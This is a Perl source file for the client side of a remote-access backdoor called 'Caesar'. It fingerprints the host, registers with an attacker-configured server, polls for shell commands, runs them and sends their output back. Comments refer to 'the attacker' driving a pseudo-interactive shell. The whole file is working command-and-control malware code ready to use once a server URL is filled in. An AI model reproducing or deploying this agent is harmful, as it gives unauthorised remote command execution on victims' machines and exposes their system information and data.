#!/usr/bin/perl
# TOCHECK:  perl -e 'open(P, "| kate &"); while() { print $_; } close P; print "lol\n";' 

use 5.10.0;

use strict;
use warnings;
no warnings 'experimental';

use LWP::UserAgent;
use LWP::ConnCache;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use File::chdir;
use Digest::MD5 qw(md5_hex);
use URI::Escape;
use UUID::Generator::PurePerl;

# Replace with your URL/IP
my $caesar_folder = '__CAESAR-URL__';

# Getting information from the system
my $hostname = `uname -n`;
chomp $hostname;

my $username = `id -un`;
chomp $username;

my $operating_system = `uname -sr`;
chomp $operating_system;
$operating_system =~ s/ /%20/gi;

my $arch = `uname -m`;
chomp $arch;

if($arch eq "x86_64") {
    $arch = '64bit';
} else {
    $arch = '32bit';
}

my $ug = UUID::Generator::PurePerl->new();
my @uuid_parts = split(/\-/, $ug->generate_v1());
my $mac = "";

my @chars = split(//, $uuid_parts[-1]);

for(my $i = 0; $i < 0+@chars; $i++) {
    $mac .= $chars[$i];
    $mac .= ':' if($i%2 && $chars[$i+1]);
}

my $working_directory = $CWD;

# Generating unique id
my $unique_id = md5("$mac$operating_system$arch");

# Setting refresh delay
my $delay = 10;

# Cookies
my $cookie_jar = HTTP::Cookies->new(
    file           => "/tmp/cookies.lwp",
    autosave       => 1,
    ignore_discard => 1,
);

# Browser object
my $browser = LWP::UserAgent->new();
$browser->timeout(15);
$browser->protocols_allowed( [qw( http https ftp ftps )] );
$browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
$browser->cookie_jar($cookie_jar);
$browser->conn_cache(LWP::ConnCache->new());

# Write usefull informations to debug.log
my $DEBUG = 0;

debugLog("ceaser_folder: $caesar_folder\nhostname: $hostname\nusername: $username\noperating_system: $operating_system\narch: $arch\nmac: $mac\nunique_id: $unique_id\nworking_directory: $working_directory\n\n") if($DEBUG);

sub debugLog {
    my ( $content ) = @_;
    print "$content\n";
    open FILE, ">>", "debug.log"  or die("Couldn't open . debug.log");
    print FILE "$content\n";
    close FILE;
    
}

sub md5 {
    my ( $string ) = @_;
    
    return md5_hex($string);
}

sub split_response {
    my ( $response, $start_separator, $end_separator ) = @_;
    
    my @output = ();
    my @tmp = split($start_separator, $response->content);
    
    foreach my $part (@tmp) {
        if($part =~ /$end_separator/i) {
            my @subparts = split($end_separator, $part);
            push(@output, $subparts[0]) if($subparts[0]);
        }
    }
    
    return @output
}

sub send_data {
    my ( $url, $content ) = @_;
    
    my $request = HTTP::Request->new('POST', $url);
    $request->content_type('application/x-www-form-urlencoded');
    $request->content($content);
    
    my $response = $browser->request($request);
    debugLog($response->request->uri . "\n" . '-'x60 . "\n" . $response->as_string() . "\n" . '-'x60 . "\n\n") if($DEBUG);
    
    return $response;
}

sub execute_command {
    my $command = $_[0];
    ($_ = qx{$command 2>&1}, $? >> 8);
}

# while the server does not responds 'OK' sends an handshake request
while(1) {
    my $data = "hostname=" . uri_escape($hostname) . "&username=" . uri_escape($username) . "&os=" . uri_escape($operating_system) . "&arch=$arch&unique_id=$unique_id&wd=" . uri_escape($working_directory);
    my $response = send_data($caesar_folder . '/target/handshake.php', $data);
    
    if($response->content =~ /OK/i) {
        last;
    } else {
        print "Connection refused : " . $response->code . "\n" if($DEBUG);
        sleep (1);
    }
}

my $no_response = 0;
my @subprocesses = ();

while(1) {
    # Checking if some subprocess has terminated
    if(0+@subprocesses) {
        my @non_terminated = ();
        foreach my $process (@subprocesses) {
            # If process has terminated:
            if($process->{output}) {
                my $data = "unique_id=" . $unique_id . "&command=" . $process->{command} . "&task_id=" . $process->{task_id} .  "&output=" . $process->{output} . "&wd=" . uri_escape($process->{wd});
                my $response = send_data($caesar_folder . '/target/output.php', $data);
            } else {
                push(@non_terminated, $process);
            }
        }
        @subprocesses = @non_terminated;
        @non_terminated = ();
    }
    
    # Check if there are new commands to execute
    my $response = send_data($caesar_folder . '/target/tasks.php', "unique_id=" . $unique_id);
    
    # If the response from the server is not empty
    if($response->content) {
        # Splitting the response in order to get a list of commands to execute (and their identifiers)
        my @commands = split_response($response, '<command>', '</command>');
        my @ids = split_response($response, '<task_id>', '</task_id>');
        
        # Executing all commands contained in the list
        for(my $i = 0; $i < 0+@commands; $i++) {
            my $command = $commands[$i];
            my $output = 0;
            my $task_id = 0;
            $task_id = $ids[$i] if($ids[$i]);
            
            my $process = {
                'post_url' => $caesar_folder . '/target/output.php',
                'command' => $command,
                'task_id' => $task_id,
                'wd' => $CWD,
                'delay' => 1,
                'post_data' => 0,
                'output' => 0,
                'status' => 0,
            };
            
            given($command)
            {
                # If the user want a remote pseudo-connection
                when(/^connect$/i) {
                    $process->{delay} = 1;
                    $process->{output} = 'connected';
                }
                
                when(/^exit$/i) {
                    $process->{delay} = 1;
                    $process->{output} = 'exit';
                }
                
                when(/^cd /i) {
                    my $directory = $command;
                    $directory =~ s/cd //gi;
                    $working_directory = $CWD;
                    eval {
                        $CWD = $directory;
                    };
                    
                    if($@) {
                        $process->{output} = "Warning: Couldn't Move To : $directory\n";
                        $CWD = $working_directory;
                    } else {
                        $process->{output} = "Working Directory : $CWD\n";
                    }
                }
                
                # If the user want a remote pseudo-connection
                default {
                    my ($out, $status) = execute_command($command);
                    chomp $out;
                    if(!$status) {
                        $process->{output} = $out;
                    } else {
                        $process->{output} = "[ERROR] " . $out;
                        # Status = 0 => no error / status = 2 => error
                    }
                    # TODO: Really usefull ?!
                    my @new_subprocess = ();
                    push(@new_subprocess, $process);
                    
                    sleep(0.5);
                }
            }
            
            # Send the output to the server
            $process->{post_data} = "unique_id=" . $unique_id . '&command=' . uri_escape($process->{command}) . '&task_id=' . $process->{task_id} . '&output=' . uri_escape($process->{output}) . '&wd=' . uri_escape($process->{wd});
            send_data($process->{post_url}, $process->{post_data});
            
            sleep($process->{delay});
        }
    } else {
        my $no_response = 0;
        # If the attacker is running a pseudo-interactive shell and he's not issuing commands
        if($delay != 10) {
            # Increment the number of no-responses
            $no_response++;
            
            # If there are too many no-responses from the server reset the delay (close the interactive-shell)
            if($no_response >= 60) {
                $delay = 10;
                $no_response = 0;
            }
        }
    }
    sleep($delay);
}
